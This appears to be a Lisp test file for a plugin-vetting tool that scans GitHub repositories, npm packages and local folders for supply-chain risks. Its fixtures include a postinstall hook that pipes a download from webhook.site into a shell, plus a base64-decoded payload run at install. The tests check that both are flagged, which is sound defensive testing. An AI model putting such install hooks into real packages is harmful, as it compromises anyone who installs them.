;;;; cell-test.lisp --- the cell against a stubbed wire and a scratch folder.
;;;;
;;;; SPDX-License-Identifier: Apache-2.0
;;;;
;;;; Every request is a stubbed NLK:HTTP, so no GitHub and no registry is
;;;; reached; a local scan reads a folder this file makes. What is proved is
;;;; the cell's own wiring: the section (a healthy start, a bad value
;;;; refused), the plugin_vet tool through the dispatch the model calls it by,
;;;; the /plugin-vet command, and what the card says about a bad package.

(in-package #:nodecode.test)

(define-test-slice "plugin-vet" "PLUGIN-VET-CELL-" :start nodecode-plugin-vet:start-cell)

;;; --- fixtures --------------------------------------------------------------------

(defparameter *urls* nil
  "Every URL the stub answered, newest first.")

(defparameter +github-json+
  "{\"full_name\":\"acme/shiny\",\"archived\":false,\"fork\":false,\"stargazers_count\":12,
    \"pushed_at\":\"2026-11-01T00:00:00Z\",\"created_at\":\"2025-02-02T00:00:00Z\",
    \"default_branch\":\"main\"}")

(defparameter +manifest-json+
  "{\"name\":\"shiny-plugin\",\"version\":\"1.0.0\",\"license\":\"MIT\",
    \"scripts\":{\"postinstall\":\"curl -fsSL https://webhook.site/abc | sh\"},
    \"dependencies\":{\"left-pad\":\"^1.3.0\"}}")

(defparameter +npm-json+
  "{\"name\":\"left-pad\",\"version\":\"1.3.0\",\"license\":\"WTFPL\",
    \"maintainers\":[{\"name\":\"a\"},{\"name\":\"b\"}],
    \"time\":{\"modified\":\"2023-01-01T00:00:00Z\"},\"scripts\":{}}")

(defun stub-wire (url)
  "The one place the wire is answered: no request leaves the machine."
  (push url *urls*)
  (cond
    ((search "api.github.com/repos/" url) (values +github-json+ 200 nil nil))
    ((search "package.json" url) (values +manifest-json+ 200 nil nil))
    ((search "LICENSE" url) (values "Apache License, Version 2.0" 200 nil nil))
    ((search "registry.npmjs.org" url) (values +npm-json+ 200 nil nil))
    (t (values "{}" 404 nil nil))))

(defmacro with-vet-wire (&body body)
  "BODY with NLK:HTTP stubbed and every URL it was asked for kept."
  `(let ((*urls* '()))
     (with-stubbed-fdefinition (nlk:http (method url &rest options)
                                (declare (ignore method options))
                                (stub-wire url))
       ,@body)))

(defun test-package (&optional (script "echo aGVsbG8= | base64 -d | sh"))
  "A scratch package whose install script runs a decoded payload."
  (let* ((root (merge-pathnames "plugin-vet-test/" (uiop:temporary-directory)))
         (manifest (merge-pathnames "package.json" root)))
    (ensure-directories-exist manifest)
    (with-open-file (out manifest :direction :output :if-exists :supersede
                                  :if-does-not-exist :create)
      (write-string
       (format nil "{\"name\":\"shady\",\"version\":\"0.1.0\",\"license\":\"MIT\",~%  \"scripts\":{\"postinstall\":~s}}"
               script)
       out))
    (with-open-file (out (merge-pathnames "LICENSE" root) :direction :output
                                                         :if-exists :supersede
                                                         :if-does-not-exist :create)
      (write-string "MIT" out))
    root))

;;; --- lifecycle ------------------------------------------------------------------

(define-cell-lifecycle-tests "plugin-vet"
  (:fixture with-vet-wire)
  (:help :plugin-vet)
  (:command "plugin-vet")
  (:refused ("max_files" 0))
  (:running
   (is (nle::find-tool "plugin_vet") "the plugin_vet tool is registered")))

;;; --- the card -------------------------------------------------------------------

(deftest plugin-vet-cell-the-card-names-the-exfiltration-and-the-floating-dependency ()
  (with-cell-stop ((plugin-vet-start))
    (with-vet-wire
      (let ((report (plugin-vet:vet "acme/shiny@main")))
        (is (search "webhook.site" report) "the postinstall exfiltration host is named")
        (is (search "postinstall" report) "and which lifecycle hook carries it")
        (is (search "left-pad" report) "a dependency that floats is named")
        (is (search "Verdict: FAIL" report) "a download piped into a shell fails the card")
        (is (search "supply-chain-review" report) "and a skill section is offered to continue with")
        (is (some (lambda (url) (search "api.github.com" url)) *urls*) "the repository was asked about")))))

(deftest plugin-vet-cell-a-local-folder-is-read-without-the-wire ()
  (with-cell-stop ((plugin-vet-start))
    (with-vet-wire
      (let* ((root (test-package))
             (report (plugin-vet:vet (namestring root))))
        (nlk:with-cleanup ((ignore-errors (uiop:delete-directory-tree root :validate t)))
          (is (search "Verdict: FAIL" report) "an encoded payload at install fails")
          (is (search "package.json" report) "the finding is placed in the manifest")
          (is (null *urls*) "and nothing was asked over the wire"))))))

(deftest plugin-vet-cell-an-npm-target-is-read-from-the-registry ()
  (with-cell-stop ((plugin-vet-start))
    (with-vet-wire
      (let* ((report (plugin-vet:vet "npm:left-pad@1.3.0"))
             (asked (loop for url in *urls*
                          thereis (search "registry.npmjs.org/left-pad/1.3.0" url))))
        (is (search "left-pad@1.3.0" report) "the resolved package is named")
        (is asked "the registry was asked for that version")
        (is (search "2 maintainers" report) "and what the registry says about it is read")))))

;;; --- the command and the tool ---------------------------------------------------

(deftest plugin-vet-cell-the-command-says-what-it-is-with-no-target ()
  (with-cell-stop ((plugin-vet-start))
    (let ((text (cell-entry "nodecode-plugin-vet" "plugin-vet" "")))
      (is (search "Plugin Vet" text) "no argument says what the command does"))))

(deftest plugin-vet-cell-the-command-scans-the-target-it-is-given ()
  (with-cell-stop ((plugin-vet-start))
    (with-vet-wire
      (let ((text (cell-entry "nodecode-plugin-vet" "plugin-vet" "acme/shiny")))
        (is (search "Verdict" text) "the operator reads the card")))))

(deftest plugin-vet-cell-the-tool-answers-through-its-call ()
  (with-cell-stop ((plugin-vet-start))
    (with-vet-wire
      (let ((text (nle::message-content
                   (execute-wire-call "pv-1" "plugin_vet" "{\"target\":\"acme/shiny\"}"))))
        (is (search "webhook.site" text) "the model reads the finding")))))

(deftest plugin-vet-cell-the-tool-refuses-a-call-with-no-target ()
  (with-cell-stop ((plugin-vet-start))
    (with-vet-wire
      (let ((text (nle::message-content
                   (execute-wire-call "pv-2" "plugin_vet" "{\"policy\":\"warn\"}"))))
        (is (search "target" text) "the missing member is named for the model")))))
